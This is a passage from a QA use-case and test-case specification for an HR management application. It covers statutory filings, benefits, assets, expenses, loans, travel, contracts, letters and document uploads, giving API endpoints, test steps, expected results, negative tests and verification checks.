- **API Endpoint:** POST /api/v1/statutory/filings/esi-return
- **Test Steps:**
  1. Generate ESI return; verify contribution breakdown; upload challan; mark as filed
- **Expected Result:** ESI return filed with correct employee/employer split
- **Negative Test:** File when payroll not processed → "Cannot file return: payroll not processed"
- **Verification:** `GET /api/v1/statutory/filings?type=ESI&month={month}` returns `status: FILED`

### UC-STAT-008 — TDS Monthly Challan

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/tax
- **API Endpoint:** GET /api/v1/statutory/tds/challan?month={month}
- **Test Steps:**
  1. Generate challan 281; verify BSR code, tax amount, surcharge, cess
  2. Upload payment confirmation; mark paid
- **Expected Result:** TDS challan = total tax deducted; payment tracked
- **Negative Test:** Generate before payroll locked → "Finalize payroll before generating TDS
  challan"
- **Verification:** Challan total = sum of `tds_deduction` across all employees

### UC-STAT-009 — Form 10B Attestation

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/statutory-filings
- **API Endpoint:** GET /api/v1/statutory/form10b
- **Test Steps:**
  1. Select Form 10B; verify member-wise PF data; generate and download PDF
- **Expected Result:** Form 10B with correct member details and contribution totals
- **Negative Test:** Employees missing PF numbers → "X employees missing PF account numbers"
- **Verification:** PDF contains all active employees with non-zero PF contribution

### UC-STAT-010 — Tax Regime Selection (Old vs New)

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/tax/declarations
- **API Endpoint:** PUT /api/v1/tax/declarations/regime
- **Test Steps:**
  1. Select New Regime → view projected tax (no deductions)
  2. Switch to Old Regime → enter 80C ₹150,000; HRA exemption; LTA
  3. Save; verify payroll uses selected regime from next month
- **Expected Result:** TDS calculated using selected regime
- **Negative Test:** Switch after April 30 deadline → "Deadline has passed for this financial year"
- **Verification:** `GET /api/v1/tax/declarations/my` returns `regime: OLD_REGIME` or `NEW_REGIME`

---

## Benefits — Expanded

### UC-BEN-003 — Add Dependent to Health Plan

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/benefits
- **API Endpoint:** POST /api/v1/benefits/dependents
- **Test Steps:**
  1. Add Spouse as dependent with DOB, gender, ID proof
  2. Verify premium updated (family plan rate)
- **Expected Result:** Dependent added; premium recalculated; payroll deduction updated
- **Negative Test:** Child DOB making them > 25 years → "Not eligible; dependents above 25 not
  covered"
- **Verification:** `GET /api/v1/benefits/enrollment/{id}` shows dependent in `covered_members`

### UC-BEN-004 — Modify Enrollment During Open Period

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/benefits
- **API Endpoint:** PUT /api/v1/benefits/enrollment/{id}
- **Test Steps:**
  1. Change Individual → Family coverage; remove a dependent; change dental tier; save effective
     next month
- **Expected Result:** Enrollment updated; premium difference in next payslip
- **Negative Test:** Modify outside open enrollment window → "Only allowed during open enrollment (
  Dec 1–31)"
- **Verification:** `GET /api/v1/benefits/enrollment/{id}` returns updated plan tier

### UC-BEN-005 — Benefit Eligibility Rule Config

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/benefits
- **API Endpoint:** PUT /api/v1/benefits/plans/{id}/eligibility
- **Test Steps:**
  1. Set eligibility: Tenure ≥ 6 months, Employment Type=Full-Time, Grade ≥ L3
  2. Ineligible employee cannot enroll; eligible employee sees plan in catalog
- **Expected Result:** Eligibility enforced at enrollment
- **Negative Test:** 3-month tenure employee enrolls → "Not eligible: tenure requirement is 6
  months"
- **Verification:** `GET /api/v1/benefits/catalog?employeeId={ineligibleId}` excludes restricted
  plan

### UC-BEN-006 — Benefit Deduction in Payslip

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN (verifier)
- **URL:** http://localhost:3000/payroll/payslips
- **API Endpoint:** GET /api/v1/payroll/payslips/{id}
- **Preconditions:**
  - Employee enrolled; premium = ₹2,000/month
- **Test Steps:**
  1. Run payroll; verify "Health Insurance Premium" = ₹2,000 in deductions
- **Expected Result:** Benefit premium appears as deduction line
- **Negative Test:** Unenrolled employee → no benefit deduction line
- **Verification:** `GET /api/v1/payroll/payslips/{id}` returns `deductions.health_insurance: 2000`

### UC-BEN-007 — EAP Enrollment

- **Priority:** P3
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/benefits
- **API Endpoint:** POST /api/v1/benefits/enrollment
- **Test Steps:**
  1. Enroll in EAP (free plan); verify access details (hotline, portal link) shown
- **Expected Result:** EAP confirmed; no premium; contact details visible
- **Negative Test:** Enroll twice → "Already enrolled in this benefit"
- **Verification:** `GET /api/v1/benefits/my-enrollments` shows EAP plan

### UC-BEN-008 — Benefit Plan Expiry and Renewal

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/benefits
- **API Endpoint:** PUT /api/v1/benefits/plans/{id}/renew
- **Test Steps:**
  1. Renew plan expiring in 30 days; update premium rates; notify enrolled employees
- **Expected Result:** Plan renewed; new premium effective from renewal date; employees notified
- **Negative Test:** Plan expires without renewal → enrolled employees receive "Benefit plan
  expired" notification
- **Verification:** `GET /api/v1/benefits/plans/{id}` returns `status: ACTIVE` with new expiry date

---

## Assets — Expanded

### UC-ASSET-003 — Asset Condition Update

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/assets/{id}
- **API Endpoint:** PUT /api/v1/assets/{id}/condition
- **Test Steps:**
  1. Change condition GOOD → DAMAGED; add description; save; verify history logged
- **Expected Result:** Condition updated; history entry with timestamp and reporter
- **Negative Test:** EMPLOYEE updates condition → 403
- **Verification:** `GET /api/v1/assets/{id}` returns `condition: DAMAGED`; history has new entry

### UC-ASSET-004 — Asset Maintenance Request

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/assets/{id}
- **API Endpoint:** POST /api/v1/assets/{id}/maintenance-requests
- **Test Steps:**
  1. Request maintenance on assigned asset; describe issue; set priority=HIGH
  2. IT Admin assigns technician; mark resolved with notes
- **Expected Result:** Request created → assigned → resolved; status history tracked
- **Negative Test:** Request on asset not assigned to you → 403
- **Verification:** `GET /api/v1/assets/{id}/maintenance-requests` returns `status: RESOLVED`

### UC-ASSET-005 — Asset Write-Off

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/assets/{id}
- **API Endpoint:** PUT /api/v1/assets/{id}/write-off
- **Test Steps:**
  1. Write off DAMAGED unassigned asset; verify not in active inventory; audit logged
- **Expected Result:** Status = WRITTEN_OFF; removed from active list; audit entry
- **Negative Test:** Write off asset currently assigned → "Return asset first"
- **Verification:** `GET /api/v1/assets?status=ACTIVE` excludes written-off asset

### UC-ASSET-006 — Asset Utilization Report

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/reports
- **API Endpoint:** GET /api/v1/reports/assets
- **Test Steps:**
  1. View total/assigned/unassigned/maintenance/written-off counts by category; export
- **Expected Result:** Accurate counts; export works
- **Negative Test:** EMPLOYEE accesses utilization report → 403
- **Verification:** Report counts match `GET /api/v1/assets/stats`

### UC-ASSET-007 — Asset Handover Form on Resignation

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/offboarding/{id}
- **API Endpoint:** PUT /api/v1/assets/assignments/{id}/return
- **Test Steps:**
  1. Offboarding checklist → "Return Assets"; confirm return of each asset; generate signed handover
     form
- **Expected Result:** Assets → UNASSIGNED; handover form signed; FnF clearance status updated
- **Negative Test:** Mark FnF cleared with assets still assigned → "2 assets pending return"
- **Verification:** `GET /api/v1/assets/assignments?employeeId={id}&status=ACTIVE` returns empty
  list

### UC-ASSET-008 — Multiple Asset Assignment to Single Employee

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/assets
- **API Endpoint:** POST /api/v1/assets/assignments/bulk
- **Test Steps:**
  1. Assign laptop + monitor + keyboard simultaneously; generate combined handover form
- **Expected Result:** All 3 assigned; employee sees all in My Assets
- **Negative Test:** Assign second laptop to employee who has one → "Employee already has an
  assigned Laptop"
- **Verification:** `GET /api/v1/assets/assignments?employeeId={id}` returns all 3 assignments

---

## Expenses — Expanded Use Cases

### UC-EXP-002 — Mileage Expense Claim

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/expenses/new
- **API Endpoint:** POST /api/v1/expenses
- **Playwright Spec:** `frontend/e2e/expenses.spec.ts`
- **Preconditions:** Mileage rate configured in expense policy (e.g., ₹8/km)
- **Test Steps:**
  1. New expense → Category: "Travel/Mileage"; enter 45 km; system auto-calculates ₹360
  2. Add trip description and date; attach route screenshot; submit
- **Expected Result:** Expense amount = km × rate; status = PENDING; manager notified
- **Negative Test:** Enter 0 km → "Distance must be greater than 0"
- **Verification:** `GET /api/v1/expenses/{id}` →
  `amount: 360, category: MILEAGE, calculationMethod: PER_KM`

### UC-EXP-003 — Policy Limit Enforcement

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/expenses/new
- **API Endpoint:** POST /api/v1/expenses
- **Preconditions:** Meal expense policy limit = ₹500/day
- **Test Steps:**
  1. Submit meal expense of ₹750 for single day; attach receipt
- **Expected Result:** System warns "Exceeds daily meal limit of ₹500"; expense submitted but
  flagged for HR review
- **Negative Test:** Employee in role with no expense policy → "No expense policy assigned to your
  role"
- **Verification:** `GET /api/v1/expenses/{id}` → `policyViolation: true, overageAmount: 250`

### UC-EXP-004 — Receipt OCR Auto-Fill

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/expenses/new
- **API Endpoint:** POST /api/v1/expenses/parse-receipt
- **Preconditions:** OCR service enabled in tenant settings
- **Test Steps:**
  1. Upload receipt image; system extracts vendor, amount, date via OCR
  2. Verify pre-filled fields; adjust if incorrect; submit
- **Expected Result:** Amount, merchant, date auto-populated from receipt image
- **Negative Test:** Upload non-receipt image (blank page) → "Unable to extract expense details —
  please fill manually"
- **Verification:** Extracted data matches receipt content; manual override tracked

### UC-EXP-005 — Multi-Level Expense Approval

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_MANAGER → HR_ADMIN
- **URL:** http://localhost:3000/approvals/expenses
- **API Endpoint:** POST /api/v1/approvals/{id}/approve
- **Preconditions:** Expense policy: >₹2,000 requires 2-level approval
- **Test Steps:**
  1. Employee submits ₹3,500 expense
  2. Manager (Level 1) approves; HR_ADMIN (Level 2) approves
  3. Finance marks as reimbursed
- **Expected Result:** Both approvals captured sequentially; final status = APPROVED; employee
  notified at each stage
- **Negative Test:** Manager tries to self-approve own expense → "Self-approval not permitted"
- **Verification:** `GET /api/v1/approvals/{id}/tasks` shows 2 completed tasks with approver IDs

### UC-EXP-006 — Expense Reimbursement Processing

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/expenses/reimbursements
- **API Endpoint:** POST /api/v1/expenses/reimbursements/batch
- **Preconditions:** 5+ approved expenses pending reimbursement
- **Test Steps:**
  1. Filter approved expenses by period; select all; click "Process Reimbursement"
  2. Choose payment mode (bank transfer); confirm batch
- **Expected Result:** All selected → REIMBURSED; employees notified; reimbursement record created
- **Negative Test:** Try to reimburse unapproved expense → "Only approved expenses can be
  reimbursed"
- **Verification:** `GET /api/v1/expenses?status=REIMBURSED&period=current` returns all processed

### UC-EXP-007 — Expense Report Generation

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/reports/expenses
- **API Endpoint:** GET /api/v1/reports/expenses
- **Test Steps:**
  1. Navigate to Expense Reports; filter by department + date range
  2. Export as Excel; verify columns: employee, category, amount, status, receipt
- **Expected Result:** Report covers all expenses in range; totals by category shown; Excel export
  downloads
- **Negative Test:** Employee role accesses expense report for other employees → HTTP 403
- **Verification:** Report total matches sum of individual expenses in DB

### UC-EXP-008 — Expense Category CRUD

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/settings/expenses/categories
- **API Endpoint:** POST /api/v1/expense-categories
- **Test Steps:**
  1. Create category "Client Entertainment" with daily limit ₹1,000 and receipt required flag
  2. Edit to change limit to ₹1,500; save
  3. Delete unused category; verify active category list
- **Expected Result:** Category appears in expense form; limit enforced on submission
- **Negative Test:** Create duplicate category name → "Category name already exists"
- **Verification:** `GET /api/v1/expense-categories` returns new category with correct limits

### UC-EXP-009 — Expense Policy Configuration

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/settings/expenses/policies
- **API Endpoint:** POST /api/v1/expense-policies
- **Test Steps:**
  1. Create policy "Senior Staff" with monthly cap ₹10,000; assign to roles HR_MANAGER and above
  2. Create policy "Junior Staff" with cap ₹3,000; assign to EMPLOYEE role
- **Expected Result:** Policy applies based on employee role; correct limits shown in expense form
- **Negative Test:** Assign policy to non-existent role → validation error
- **Verification:** `GET /api/v1/expense-policies?roleId={id}` returns correct policy for each role

### UC-EXP-010 — Cash Advance Settlement

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** Employee → HR_ADMIN
- **URL:** http://localhost:3000/expenses/advances
- **API Endpoint:** POST /api/v1/expense-advances/{id}/settle
- **Preconditions:** Employee received ₹2,000 cash advance; actual expenses = ₹1,600
- **Test Steps:**
  1. Employee submits settlement: ₹1,600 spent (with receipts); ₹400 returned
  2. HR_ADMIN verifies and marks advance as settled
- **Expected Result:** Advance status = SETTLED; ₹400 refund logged; net reimbursement = ₹0 (advance
  covered)
- **Negative Test:** Submit settlement with expenses > advance without explanation → warning flag
- **Verification:** `GET /api/v1/expense-advances/{id}` → `status: SETTLED, returnedAmount: 400`

---

## Loans — Expanded Use Cases

### UC-LOAN-002 — Loan Request Approval Workflow

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee → HR_ADMIN → TENANT_ADMIN
- **URL:** http://localhost:3000/loans/new
- **API Endpoint:** POST /api/v1/loans
- **Preconditions:** Loan policy requires HR_ADMIN + TENANT_ADMIN dual approval for amounts >₹50,000
- **Test Steps:**
  1. Employee requests ₹75,000 salary loan; selects 12-month tenure
  2. HR_ADMIN approves; TENANT_ADMIN approves
  3. Loan status transitions to APPROVED → DISBURSED
- **Expected Result:** Two approval tasks created; employee notified at each stage; disbursement
  triggered
- **Negative Test:** Employee with existing active loan requests another → "Active loan already
  exists — repay before applying"
- **Verification:** `GET /api/v1/loans/{id}` →
  `status: DISBURSED, approvalChain: [{HR_ADMIN, APPROVED}, {TENANT_ADMIN, APPROVED}]`

### UC-LOAN-003 — EMI Calculation Verification

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/loans/calculator
- **API Endpoint:** GET /api/v1/loans/calculate
- **Test Steps:**
  1. Enter principal ₹60,000; 10 months; 0% interest (salary loan)
  2. Verify EMI = ₹6,000/month exactly
  3. Test with interest-bearing loan: ₹100,000; 12 months; 10% annual → EMI = ₹8,791.59
- **Expected Result:** EMI calculations match standard formula; repayment schedule shows all 12
  installments with dates
- **Negative Test:** Enter tenure = 0 → "Tenure must be at least 1 month"
- **Verification:** Sum of all EMIs = principal + total interest; no rounding drift

### UC-LOAN-004 — Payroll Auto-Deduction for Loan EMI

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN (payroll run)
- **URL:** http://localhost:3000/payroll/run
- **API Endpoint:** POST /api/v1/payroll/runs
- **Preconditions:** Employee has active loan with ₹5,000 monthly EMI
- **Test Steps:**
  1. Run payroll for month; verify loan deduction appears in payslip
  2. Check `LOAN_DEDUCTION` line item = ₹5,000
  3. After deduction, verify remaining loan balance decreased by ₹5,000
- **Expected Result:** EMI auto-deducted; remaining balance updated; loan schedule updated
- **Negative Test:** Payroll run for month where loan already deducted → no duplicate deduction
- **Verification:** `GET /api/v1/loans/{id}/schedule` → installment for month marked PAID

### UC-LOAN-005 — Loan Prepayment

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** Employee → HR_ADMIN
- **URL:** http://localhost:3000/loans/{id}/prepay
- **API Endpoint:** POST /api/v1/loans/{id}/prepay
- **Preconditions:** Active loan with 8 installments remaining
- **Test Steps:**
  1. Employee requests full prepayment; HR_ADMIN confirms
  2. Prepayment amount = remaining principal; loan closed
- **Expected Result:** Loan status = CLOSED; remaining installments cancelled; confirmation letter
  generated
- **Negative Test:** Prepayment amount less than minimum (1 month EMI) → "Minimum prepayment is
  ₹5,000"
- **Verification:** `GET /api/v1/loans/{id}` → `status: CLOSED, remainingBalance: 0`

### UC-LOAN-006 — Loan Balance Self-Service View

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/my-space/loans
- **API Endpoint:** GET /api/v1/loans/my
- **Test Steps:**
  1. Employee views My Space → Loans; sees outstanding balance, EMI amount, next deduction date
  2. Views full repayment schedule with paid/pending status per installment
- **Expected Result:** Accurate balance, next deduction date, remaining tenure displayed
- **Negative Test:** Employee without any loan → "No active loans" empty state shown
- **Verification:** Displayed balance matches DB `remaining_balance` field

---

## Travel — Expanded Use Cases

### UC-TRAVEL-002 — Post-Trip Expense Submission

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/travel/{id}/expenses
- **API Endpoint:** POST /api/v1/travel/{id}/expenses
- **Preconditions:** Travel request approved; employee returned from trip
- **Test Steps:**
  1. Open approved travel request; click "Submit Expenses"
  2. Add hotel (₹3,000/night × 2), meals (₹600/day × 3), taxi (₹450)
  3. Attach receipts for each; submit for reimbursement
- **Expected Result:** Expense bundle linked to travel request; total calculated; approval triggered
- **Negative Test:** Submit expenses after 30-day post-trip deadline → "Expense submission window
  closed"
- **Verification:** `GET /api/v1/travel/{id}` → `expenseTotal: 8250, expenseStatus: PENDING`

### UC-TRAVEL-003 — Per Diem Calculation

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/travel/new
- **API Endpoint:** GET /api/v1/travel/per-diem
- **Preconditions:** Per diem rate: domestic ₹800/day, international $50/day
- **Test Steps:**
  1. New travel request; destination = "Bangalore" (domestic); duration = 3 days
  2. System shows per diem allowance = ₹2,400
  3. Test international: "London"; 5 days → $250
- **Expected Result:** Per diem auto-calculated based on destination type and duration
- **Negative Test:** Select duration > 30 days → "Travel requests exceeding 30 days require
  TENANT_ADMIN approval"
- **Verification:** `GET /api/v1/travel/per-diem?destination=Bangalore&days=3` returns `2400`

### UC-TRAVEL-004 — International Travel Request

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** Employee → HR_ADMIN → TENANT_ADMIN
- **URL:** http://localhost:3000/travel/new
- **API Endpoint:** POST /api/v1/travel
- **Preconditions:** Policy: international travel requires 3-level approval
- **Test Steps:**
  1. Submit travel to "New York"; upload visa, passport details; project justification
  2. Manager → HR_ADMIN → TENANT_ADMIN approval chain executes
- **Expected Result:** All 3 approvals captured; forex allowance calculated; travel dates blocked in
  attendance
- **Negative Test:** Missing visa document for international travel → "Visa copy is mandatory for
  international travel"
- **Verification:** Attendance shows travel dates as "ON DUTY"; `GET /api/v1/travel/{id}` shows full
  approval chain

### UC-TRAVEL-005 — Travel Request Rejection and Resubmission

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee ↔ Manager
- **URL:** http://localhost:3000/travel
- **API Endpoint:** POST /api/v1/approvals/{id}/reject
- **Test Steps:**
  1. Manager rejects travel with reason "Insufficient budget this quarter"
  2. Employee sees rejection; updates request with alternate dates; resubmits
  3. Manager approves revised request
- **Expected Result:** Original rejection logged; revised submission creates new approval task;
  original preserved for audit
- **Negative Test:** Employee tries to edit approved travel request → "Approved requests cannot be
  modified"
- **Verification:** `GET /api/v1/travel/{id}/history` shows REJECTED → RESUBMITTED → APPROVED chain

### UC-TRAVEL-006 — Travel Policy Configuration

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/settings/travel/policies
- **API Endpoint:** POST /api/v1/travel-policies
- **Test Steps:**
  1. Configure domestic policy: economy class mandatory, hotel cap ₹3,500/night
  2. Configure international policy: business class allowed for >8hr flights, hotel cap $150/night
  3. Assign policies to grade bands
- **Expected Result:** Policies enforced during expense submission; violations flagged
- **Negative Test:** Create policy with negative hotel cap → validation error
- **Verification:** `GET /api/v1/travel-policies?grade=SENIOR` returns correct policy

---

## Contracts — Expanded Use Cases

### UC-CONTRACT-002 — Contract Template CRUD

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/settings/contracts/templates
- **API Endpoint:** POST /api/v1/contract-templates
- **Test Steps:**
  1. Create template "Permanent Employment" with placeholders: `{{employee_name}}`,
     `{{start_date}}`, `{{ctc}}`
  2. Upload DOCX base; configure signing fields (employee signature, HR signature)
  3. Edit template to add new clause; version saved as v2
  4. Delete obsolete template (with no active contracts linked)
- **Expected Result:** Template versioned; placeholder list shown; active contracts retain their
  template version
- **Negative Test:** Delete template with 3 active contracts → "Cannot delete template with active
  contracts"
- **Verification:** `GET /api/v1/contract-templates/{id}` shows current version + version history

### UC-CONTRACT-003 — Variable Substitution in Contract

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/contracts/new
- **API Endpoint:** POST /api/v1/contracts/generate
- **Preconditions:** Template with 10+ placeholders created
- **Test Steps:**
  1. Generate contract for employee from template; verify all placeholders replaced
  2. Check: name, designation, department, CTC, start date, probation period all substituted
  3. Preview PDF; no `{{` brackets visible in final output
- **Expected Result:** All placeholders substituted from employee record; zero unresolved variables
- **Negative Test:** Generate contract for employee with missing salary → "CTC not set for
  employee — cannot generate contract"
- **Verification:** Download PDF; grep for `{{` returns no matches

### UC-CONTRACT-004 — Contract Renewal Reminder

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/contracts
- **API Endpoint:** GET /api/v1/contracts?expiringIn=30
- **Preconditions:** 3 contracts expiring in next 30 days
- **Test Steps:**
  1. Scheduled job fires (or trigger manually via `POST /api/v1/admin/jobs/contract-expiry-check`)
  2. HR_ADMIN receives notification for each expiring contract
  3. Dashboard shows "3 contracts expiring soon" alert
- **Expected Result:** Notifications sent 30 days and 7 days before expiry; dashboard widget updated
- **Negative Test:** Manually renew contract 0 days before expiry → system warns "Contract expires
  today"
- **Verification:** `GET /api/v1/contracts?expiringIn=30` returns correct count

### UC-CONTRACT-005 — Multi-Signer Contract Workflow

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee → HR_ADMIN → TENANT_ADMIN
- **URL:** http://localhost:3000/contracts/{id}
- **API Endpoint:** POST /api/v1/contracts/{id}/send-for-signing
- **Preconditions:** Contract requires 3 signers: employee, HR, CEO
- **Test Steps:**
  1. HR sends contract; employee signs first via DocuSign link [SKIP-IF-NO-CREDS]
  2. After employee sign, HR signs
  3. CEO signs last; contract fully executed
- **Expected Result:** Sequential signing enforced; each signer notified when their turn arrives;
  final PDF has all 3 signatures
- **Negative Test:** HR tries to sign before employee → "Waiting for employee signature"
- **Verification:** `GET /api/v1/contracts/{id}/signatures` shows all 3 with timestamps

### UC-CONTRACT-006 — Contract Expiry Alert Configuration

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/settings/contracts
- **API Endpoint:** PUT /api/v1/settings/contracts
- **Test Steps:**
  1. Configure reminder days: 60, 30, 7 days before expiry
  2. Configure recipients: HR_ADMIN + contract employee's manager
  3. Verify notification template content
- **Expected Result:** Alerts sent at configured intervals; correct recipients receive notifications
- **Negative Test:** Set reminder to 0 days → "Reminder must be at least 1 day before expiry"
- **Verification:** `GET /api/v1/settings/contracts` shows saved reminder configuration

---

## Letters — Expanded Use Cases

### UC-LETTER-002 — Salary Certificate Generation

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN or Employee (self-service)
- **URL:** http://localhost:3000/letters/salary-certificate
- **API Endpoint:** POST /api/v1/letters/generate
- **Test Steps:**
  1. Select letter type "Salary Certificate"; choose employee; select reference date
  2. Generate; verify CTC, basic, HRA, allowances all correct
  3. Download as PDF with company letterhead and HR signature
- **Expected Result:** Certificate shows accurate current salary; company letterhead applied;
  sequential letter number assigned
- **Negative Test:** Generate salary certificate for employee on probation with no confirmed
  salary → warning message
- **Verification:** PDF contains correct salary figures; letter number is unique and sequential

### UC-LETTER-003 — No Objection Certificate (NOC)

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee (request) → HR_ADMIN (generate)
- **URL:** http://localhost:3000/letters/noc
- **API Endpoint:** POST /api/v1/letters/generate
- **Test Steps:**
  1. Employee requests NOC for "Bank Loan" purpose via My Space
  2. HR_ADMIN receives request notification; reviews and generates
  3. Employee downloads approved NOC PDF
- **Expected Result:** NOC generated with purpose statement; employee designation and tenure
  included; approved in <24h SLA
- **Negative Test:** Employee with active PIP requests NOC → "NOC cannot be issued during active
  PIP"
- **Verification:** Letter log shows NOC entry with employee ID, purpose, and generated timestamp

### UC-LETTER-004 — Offer Letter Generation

- **Priority:** P0
- **Sub-App:** NU-Hire
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/recruitment/candidates/{id}/offer
- **API Endpoint:** POST /api/v1/letters/offer
- **Test Steps:**
  1. Candidate in OFFER stage; HR creates offer with CTC breakdown
  2. System generates offer letter PDF using template; sends to candidate email
  3. Candidate accepts digitally
- **Expected Result:** Offer letter with accurate CTC (Basic=40%, HRA=20% Basic) generated;
  candidate acceptance recorded
- **Negative Test:** Generate offer without setting base CTC → "CTC is required to generate offer
  letter"
- **Verification:** `GET /api/v1/recruitment/candidates/{id}` →
  `offerStatus: ACCEPTED, offerLetterUrl: non-null`

### UC-LETTER-005 — Letter Template CRUD

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/settings/letters/templates
- **API Endpoint:** POST /api/v1/letter-templates
- **Test Steps:**
  1. Create new template "Promotion Letter" with placeholders and rich text editor (Tiptap)
  2. Configure header/footer; set letterhead; add company seal position
  3. Edit existing template; version auto-incremented
  4. Preview template with sample employee data
- **Expected Result:** Template stored; placeholders validated; preview shows rendered output
- **Negative Test:** Save template with unclosed placeholder `{{name` → "Invalid placeholder syntax"
- **Verification:** `GET /api/v1/letter-templates` returns template with version history

### UC-LETTER-006 — Bulk Letter Generation

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/letters/bulk
- **API Endpoint:** POST /api/v1/letters/bulk-generate
- **Preconditions:** Annual appraisal cycle complete; 50 employees need promotion letters
- **Test Steps:**
  1. Select letter type "Promotion Letter"; filter employees by department
  2. Select 50 employees; click "Generate Bulk"
  3. System generates all 50 in background; download as ZIP
- **Expected Result:** 50 PDFs generated with correct individual data; ZIP download available;
  progress shown
- **Negative Test:** Bulk generate with 0 employees selected → "Select at least one employee"
- **Verification:** ZIP contains exactly 50 PDFs; each PDF has correct employee name and new
  designation

### UC-LETTER-007 — Placeholder Validation on Send

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/letters/new
- **API Endpoint:** POST /api/v1/letters/validate
- **Test Steps:**
  1. Create letter from template for employee with incomplete profile (no bank details)
  2. System flags placeholders that cannot be resolved before generation
  3. Navigate to employee profile; complete missing fields; regenerate
- **Expected Result:** Validation step catches unresolvable placeholders before PDF generation
- **Negative Test:** Force generate with unresolved placeholders → API returns 422 with list of
  missing fields
- **Verification:** `POST /api/v1/letters/validate` returns
  `{valid: false, missingFields: ["bankAccount"]}`

---

## Documents — Use Cases

### UC-DOC-001 — HR Uploads Document to Employee Profile

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/employees/{id}/documents
- **API Endpoint:** POST /api/v1/employees/{id}/documents
- **Playwright Spec:** `frontend/e2e/documents.spec.ts`
- **Test Steps:**
  1. Open employee profile → Documents tab; click "Upload Document"
  2. Select type "Background Check Report"; upload PDF; add expiry date
- **Expected Result:** Document stored in Google Drive; metadata saved in DB; employee can view but
  not delete
- **Negative Test:** Upload `.exe` file → "File type not allowed — only PDF, DOCX, PNG, JPG, XLSX
  accepted"
- **Verification:** `GET /api/v1/employees/{id}/documents` returns document with
  `type: BACKGROUND_CHECK, uploadedBy: HR_ADMIN`

### UC-DOC-002 — Employee Self-Uploads Document

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** Employee
- **URL:** http://localhost:3000/my-space/documents
- **API Endpoint:** POST /api/v1/employees/me/documents
- **Test Steps:**
  1. Employee navigates to My Space → Documents; uploads PAN card scan
  2. Document visible to employee and HR; not visible to peers
- **Expected Result:** Document uploaded; HR notified for verification; employee sees pending
  verification badge
- **Negative Test:** Upload file > 10MB → "File size exceeds 10MB limit"
- **Verification:** `GET /api/v1/employees/{id}/documents?type=PAN` returns document; privacy flag
  correct

